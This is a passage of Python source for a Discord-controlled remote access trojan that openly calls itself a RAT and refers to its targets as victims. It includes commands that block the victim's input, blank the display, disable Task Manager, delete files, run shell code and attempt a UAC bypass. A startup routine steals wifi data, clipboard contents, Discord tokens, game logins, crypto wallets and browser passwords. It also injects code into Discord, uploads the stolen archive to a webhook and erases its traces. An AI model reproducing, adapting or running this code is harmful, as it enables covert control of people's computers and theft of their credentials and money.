            SC_MONITORPOWER = 61808

            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        except Exception:
            pass
    else:
        pass

def blockinput():
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            WM_SYSCOMMAND = 274
            HWND_BROADCAST = 65535
            SC_MONITORPOWER = 61808

            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
        except Exception:
            pass
    else:
        pass

@bot.command()
async def hack(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    disabletaskmanager()
    await ctx.send("✅ Disabled Task Manager")
    hidescreen()
    await ctx.send("✅ Turned off display")
    blockinput()
    await ctx.send("✅ Blocked keyboard & mouse input")

@bot.command()
async def unhack(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
            
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            
            shel = threading.Thread(target=shell)
            shel.start()
            time.sleep(1)
            shel.join()
            
            result = str(shell().stdout.decode('CP437'))
            
            if len(result) > 5:
                reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
            
            await ctx.send("✅ **Task Manager has been re-enabled.**")
        else:
            await ctx.send("⚠️ **Admin rights required! Attempting elevation...**")
            await elevate_and_retry(ctx, "enbtaskmgr")
    except Exception as e:
        await ctx.send(f"❌ **Error while re-enabling Task Manager:** `{str(e)}`")

    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            WM_SYSCOMMAND = 274
            HWND_BROADCAST = 65535
            SC_MONITORPOWER = 61808

            ctypes.windll.user32.BlockInput(False)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)

            await ctx.send("✅ **Display has been turned back on.**")
        else:
            await ctx.send("⚠️ **Admin rights required! Attempting elevation...**")
            await elevate_and_retry(ctx, "displayon")
    except Exception as e:
        await ctx.send(f"❌ **Error while turning the display back on:** `{str(e)}`")

    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.user32.BlockInput(False)

            await ctx.send("✅ **User input has been unblocked.**")
        else:
            await ctx.send("⚠️ **Admin rights required! Attempting elevation...**")
            await elevate_and_retry(ctx, "unblockinput")
    except Exception as e:
        await ctx.send(f"❌ **Error while unblocking input:** `{str(e)}`")

@bot.command()
async def delete(ctx, *, file_path: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    if not os.path.exists(file_path):
        await ctx.send("❌ The specified file or folder does not exist.")
        return

    try:
        if os.path.isfile(file_path):
            os.remove(file_path)
            await ctx.send(f"✅ **File deleted successfully**: {file_path}")
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
            await ctx.send(f"✅ **Folder deleted successfully**: {file_path}")
        else:
            await ctx.send("❌ The specified path is not a valid file or folder.")
    except Exception as e:
        await ctx.send(f"❌ Error deleting the file/folder: `{str(e)}`")

@bot.command()
async def website(ctx, url: str, amount: int):
    if amount <= 0:
        embed = discord.Embed(
            title="❌ Invalid Amount",
            description="Please provide a valid number greater than 0 for the 'amount'.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    if not url.startswith("http://") and not url.startswith("https://"):
        embed = discord.Embed(
            title="❌ Invalid URL",
            description="Please make sure the URL starts with 'http://' or 'https://'.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    try:
        start_time = time.time()
        for _ in range(amount):
            webbrowser.open(url)

        elapsed_time = time.time() - start_time
        embed = discord.Embed(
            title="🌐 Websites Opened Successfully!",
            description=f"Website: {url}\nTimes Opened: `{amount}`\nTime Taken: `{elapsed_time:.2f} seconds`",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ Error Opening Website",
            description=f"Failed to open the website: {url}\nError: `{str(e)}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

webhook_url = None
chat_gui = None
username = ".-.-.-."
chat_open = False
user_pc_name = os.getenv('USERNAME')

def send_message_to_webhook(message: str):
    if webhook_url:
        payload = {"content": message}
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code != 204:
                print("Failed to send message to webhook.")
        except Exception as e:
            print(f"Error sending message to webhook: {e}")

def update_gui_text(message: str):
    if chat_gui:
        chat_gui.config(state=tk.NORMAL)
        chat_gui.insert(tk.END, message + "\n")
        chat_gui.config(state=tk.DISABLED)
        chat_gui.yview(tk.END)

def set_username(new_username: str):
    global username
    username = new_username

def create_gradient_frame(master, width, height, colors):
    canvas = tk.Canvas(master, width=width, height=height)
    canvas.pack(fill=tk.BOTH, expand=True)
    gradient = canvas.create_rectangle(0, 0, width, height, outline="", fill="")
    canvas.create_rectangle(0, 0, width, height, fill=colors[0])
    return canvas

def create_rounded_button(parent, text, width, height, radius, bg, fg, command):
    button = tk.Button(parent, text=text, width=width, height=height, bd=0, relief="flat", bg=bg, fg=fg, command=command,
                       font=("Arial", 10, "bold"))
    button.pack(pady=5)
    return button

def create_rounded_textbox(parent, width, height, bg, fg, font):
    textbox = tk.Text(parent, wrap=tk.WORD, width=width, height=height, bg=bg, fg=fg, font=font, bd=0, relief="flat")
    textbox.pack(padx=10, pady=10)
    return textbox

@bot.command()
async def chat_start(ctx):
    global webhook_url, chat_gui, chat_open
    if chat_open:
        await ctx.send("❌ **A chat is already open. Please stop the current chat before starting a new one.**")
        return

    webhook_url = await create_webhook(ctx)

    def start_gui():
        global chat_gui, chat_open
        window = tk.Tk()
        window.configure(bg='#222222')
        window.geometry('500x400')
        window.overrideredirect(True)
        window.attributes('-topmost', True)
        window.attributes('-toolwindow', True)

        window_width = 600
        window_height = 400
        screen_width = window.winfo_screenwidth()
        screen_height = window.winfo_screenheight()
        position_top = int((screen_height / 2) - (window_height / 2))
        position_right = int((screen_width / 2) - (window_width / 2))
        window.geometry(f'{window_width}x{window_height}+{position_right}+{position_top}')

        canvas = create_gradient_frame(window, window_width, window_height, ['#111111', '#2b2b2b'])
        frame = tk.Frame(canvas, bg='#1f1f1f', bd=5, relief='solid', highlightthickness=2, highlightbackground='#444444')
        frame.place(relwidth=1, relheight=1)

        chat_gui = scrolledtext.ScrolledText(frame, width=50, height=15, wrap=tk.WORD, bg='#111111', fg='#ffffff', font=('Arial', 10, 'bold'), bd=0)
        chat_gui.pack(padx=10, pady=10)
        chat_gui.config(state=tk.DISABLED)

        user_input = create_rounded_textbox(frame, 50, 3, '#333333', '#ffffff', ('Arial', 10))

        def send_button_click():
            message = user_input.get("1.0", tk.END).strip()
            if message:
                if username == ".-.-.-.":
                    user_display_name = user_pc_name
                else:
                    user_display_name = username

                update_gui_text(f"{user_display_name}: {message}")
                send_message_to_webhook(message)
                user_input.delete("1.0", tk.END)

        send_button = create_rounded_button(frame, "Send", 10, 1, 15, '#555555', 'white', send_button_click)

        def on_drag(event):
            window.geometry(f'+{event.x_root - x_offset}+{event.y_root - y_offset}')

        def on_press(event):
            global x_offset, y_offset
            x_offset = event.x
            y_offset = event.y

        window.bind("<B1-Motion>", on_drag)
        window.bind("<Button-1>", on_press)

        window.mainloop()

    threading.Thread(target=start_gui, daemon=True).start()
    chat_open = True
    await ctx.send("🟢 **Chat started!** A chat GUI has been opened.")

@bot.command()
async def chat_stop(ctx):
    global chat_gui, chat_open

    if chat_gui:
        chat_gui.quit()
        chat_gui = None
        chat_open = False
        await ctx.send("🔴 **Chat stopped!** The chat GUI has been closed.")
    else:
        await ctx.send("❌ **No chat window open!**")

@bot.command()
async def chat(ctx, *, text: str):
    if username == "Hacker":
        await ctx.send("❌ **You need to set your username with !setusername first.**")
        return

    if chat_gui:
        if username == "Hacker":
            user_display_name = user_pc_name
        else:
            user_display_name = username

        chat_message = f"{user_display_name} : {text}"
        update_gui_text(chat_message)
        send_message_to_webhook(chat_message)
        await ctx.send(f"✅ **Message sent to chat GUI:** {text}")
    else:
        await ctx.send("❌ **No chat window open!**")

@bot.command()
async def setusername(ctx, name: str):
    set_username(name)
    await ctx.send(f"✅ **Username set to** {name}")

async def create_webhook(ctx):
    channel = ctx.channel
    try:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            if webhook.name == "ChatWebhook":
                return webhook.url
        
        webhook = await channel.create_webhook(name="ChatWebhook")
        return webhook.url
    except Exception as e:
        print(f"Error creating webhook: {e}")
        return None

@bot.command()
async def Help(ctx):
    commands_list = [
        ("!downloadfile 'attachment'", "Downloads the attached file to the users %temp% folder."),
        ("!downloadurl 'url'", "Downloads the file from the url to the users %temp% folder."),
        ("!setusername 'username'", "Sets the username that’ll be shown in chat while messaging the victim."),
        ("!runfile 'filelocation'", "Runs the file in the file location you put."),
        ("!read 'filelocation'", "Shows the contents of the file in the file location you put."),
        ("!website 'siteurl'", "Opens the siteurl in the users browser."),
        ("!delete 'filelocation'", "Deletes the file in the file location."),
        ("!get 'filelocation'", "Uploads the file in the file location to gofile then gives you the link."),
        ("!volume 'amount'", "Sets the users output device volume to the amount you put (0-100)."),
        ("!taskkill 'name'", "Kills the task you named."),
        ("!tasklist", "Shows a detailed list of all running tasks."),
        ("!uacbypass", "Attempts to bypass UAC by abusing windows vulnerability issues."),
        ("!unblockinput", "Unblocks user input."),
        ("!blockinput", "Blocks user input."),
        ("!screenshot", "Sends a screenshot of the users displays."),
        ("!shutdown", "Force shutdown the computer."),
        ("!restart", "Force restart the computer."),
        ("!logoff", "Force signout the computer."),
        ("!enbtaskmgr", "Enables task manager."),
        ("!distaskmgr", "Disables task manager."),
        ("!displayon", "Turns all displays on."),
        ("!displayoff", "Turns all displays off."),
        ("!currentdir", "Shows the RAT file directory."),
        ("!bluescreen", "Force bluescreen (BSOD) the computer."),
        ("!chat_start", "Starts & shows a chat on the victim's screen."),
        ("!hack", "Turns displays off, blocks all input, disables task manager."),
        ("!unhack", "Turns displays on, unblocks all input, enables task manager."),
        ("!Help", "Shows a list of all commands (this)."),
        ("!webcam", "Sends a picture of the user's webcam."),
        ("!voice 'text'", "Uses an AI voice to say your text to the user."),
        ("!files", "Advanced controllable file viewing of the victim's computer."),
        ("!shell 'code'", "Executes custom shell code."),
        ("!cmd 'code'", "Executes custom cmd code.")
    ]

    def chunk_commands(commands, chunk_size):
        return [commands[i:i + chunk_size] for i in range(0, len(commands), chunk_size)]

    pages = chunk_commands(commands_list, 8)

    current_page = 0

    def create_embed(page_number):
        embed = discord.Embed(
            title=f"[Page ({page_number + 1}/{len(pages)})]",
            description="",
            color=discord.Color.blue()
        )
        for command, description in pages[page_number]:
            embed.add_field(name=command, value=f"```ansi\n{description}\n```", inline=False)
        return embed

    async def on_next_button_click(interaction):
        nonlocal current_page
        if current_page < len(pages) - 1:
            current_page += 1
            await message.edit(embed=create_embed(current_page))
            await interaction.response.defer()

    async def on_previous_button_click(interaction):
        nonlocal current_page
        if current_page > 0:
            current_page -= 1
            await message.edit(embed=create_embed(current_page))
            await interaction.response.defer()

    next_button = Button(label="Next", style=discord.ButtonStyle.primary)
    previous_button = Button(label="Previous", style=discord.ButtonStyle.primary)

    next_button.callback = on_next_button_click
    previous_button.callback = on_previous_button_click

    view = View()
    view.add_item(previous_button)
    view.add_item(next_button)

    message = await ctx.send(embed=create_embed(current_page), view=view)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

    ip_address, country_address = get_ip_info()
    admin_status = "✅ Yes" if is_admin() else "❌ No"

    for guild in bot.guilds:
        client_channel = discord.utils.get(guild.text_channels, name=CHANNEL_NAME.lower())

        if client_channel:
            await client_channel.send(
                f"**⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙**\n"
                f"💻 **__𝗘𝘅𝗶𝘀𝘁𝗶𝗻𝗴 𝗖𝗹𝗶𝗲𝗻𝘁 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱__**\n"
                f"\n"
                f"👤 **User:** `{CLIENT_ID}`\n"
                f"\n"
                f"🆔 **Victim ID:** `{BOT_ID}`\n"
                f"\n"
                f"🌍 **IP Address:** `{ip_address}`\n"
                f"\n"
                f"📍 **Country:** `{country_address}`\n"
                f"\n"
                f"🔑 **Administrator:** `{admin_status}`\n"
                f"\n"
                f"⚡ For a list of commands type `Help`.\n"
                f"**⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘**\n"
                f"||@everyone||"
            )
        else:
            client_channel = await setup_client_channel(guild)
            await client_channel.send(
                f"**⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙⋙**\n"
                f"💻 **__𝗡𝗲𝘄 𝗖𝗹𝗶𝗲𝗻𝘁 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱__**\n"
                f"\n"
                f"👤 **User:** `{CLIENT_ID}`\n"
                f"\n"
                f"🆔 **Victim ID:** `{BOT_ID}`\n"
                f"\n"
                f"🌍 **IP Address:** `{ip_address}`\n"
                f"\n"
                f"📍 **Country:** `{country_address}`\n"
                f"\n"
                f"🔑 **Administrator:** `{admin_status}`\n"
                f"\n"
                f"⚡ For a list of commands type `Help`.\n"
                f"**⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘⋘**\n"
                f"||@everyone||"
            )
# - - - - - - - - - - - - - - - - - - - - - - - - - - - The RAT - - - - - - - - - - - - - - - - - - - - - - - - - -

# - - - - - - - - - - - - - - - - - - - - - - - - - - The STARTER - - - - - - - - - - - - - - - - - - - - - - - - -
async def start():
    try:
        os.system('cls')
        print("[WINDOWS] Getting ready, please wait.")
        webhook_url = f'{get_webhook_url()}'
        print("")
        print("[WINDOWS] Ready...")
        print("")

        print("[WINDOWS] Creating the vault")
        vault_folder(base_directory)

        print("[WINDOWS] Grabbing wifi information")
        try:
            wifi_info()
        except Exception:
            print("[WINDOWS] Failed to grab wifi information.")

        print("[WINDOWS] Grabbing all displays")
        try:
            display_grabber()
        except Exception:
            print("[WINDOWS] Failed to grab display information.")
            
        print(f"[WINDOWS] Grabbing clipboard content")
        try:
            clipboard()
        except Exception:
            print("[WINDOWS] Failed to grab clipboard content")

        print("[WINDOWS] Grabbing all startups")
        try:
            grab_startups()
        except Exception:
            print("[WINDOWS] Failed to grab startups.")

        print("[WINDOWS] Grabbing keyworded files")
        try:
            process_files_and_folders(base_directory, allowed_extensions, keywords)
        except Exception:
            print("[WINDOWS] Failed to grabkeyworded files")

        print("[WINDOWS] Grabbing discord information")
        try:
            discord_logins()
        except Exception:
            print("[WINDOWS] Failed to grab Discord information.")

        print("[WINDOWS] Grabbing Game Files/Logins")
        try:
            print("        [ Stealing minecraft information ]")
            StealMinecraft()
            print("        [ Stealing EpicGames information ]")
            StealEpic()
            print("        [ Stealing steam information ]")
            StealSteam()
            print("        [ Stealing uplay information ]")
            StealUplay()
        except Exception:
            print("[WINDOWS] Failed to grab Game Files/Logins.")

        print("[WINDOWS] Grabbing crypto wallets")
        try:
            print("        [ Stealing Zcash files ]")
            print("        [ Stealing Armory files ]")
            print("        [ Stealing Bytecoin files ]")
            print("        [ Stealing Jaxx files ]")
            print("        [ Stealing Exodus files ]")
            print("        [ Stealing Ethereum files ]")
            print("        [ Stealing Electrum files ]")
            print("        [ Stealing AtomicWallet files ]")
            print("        [ Stealing Guarda files ]")
            print("        [ Stealing Coinomi files ]")
            steal_wallets()
        except Exception:
            print("[WINDOWS] Failed to grab crypto wallets")

        print("[WINDOWS] Injecting malicious code into discord")
        try: 
            discord_injector = DiscordInjection()
            await discord_injector.InjectIntoToDiscord(webhook_url)
        except Exception:
            print("[WINDOWS] Failed to inject malicious code into Discord.")

        print("[WINDOWS] Finding and closing browsers")
        try:
            await kill_browsers()
        except Exception:
            print("[WINDOWS] Failed to find and close browsers.")
    except Exception:
        print("[WINDOWS] An unexpected error occurred in the main process.")

mutex = CreateMutex(None, False, "NetworkIntegrityService")
if GetLastError() == ERROR_ALREADY_EXISTS:
    print("Mutex already exists. Exiting...")
    sys.exit(0)
try:
    asyncio.run(start())
    print("[WINDOWS] Grabbing browser information")
    try:
        available_browsers = installed_browsers()
        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)
            if not master_key:
                continue
            for type_of_data_name, type_of_data in data_queries.items():
                profile = "Default" if browser not in ['opera-gx'] else ""
                data = get_data(browser_path, profile, master_key, type_of_data)
                save_results(browser, type_of_data_name, data)
    except Exception:
        print("[WINDOWS] Failed to grab browser information.")
    zip_path = zip_file(base_directory)
    send_file(discord_webhook, zip_path, base_directory)
    time.sleep(1)
    remove_traces(base_directory, zip_path)
    print("[WINDOWS] Starting RAT Connecting")
finally:
    bot.run(TOKEN)
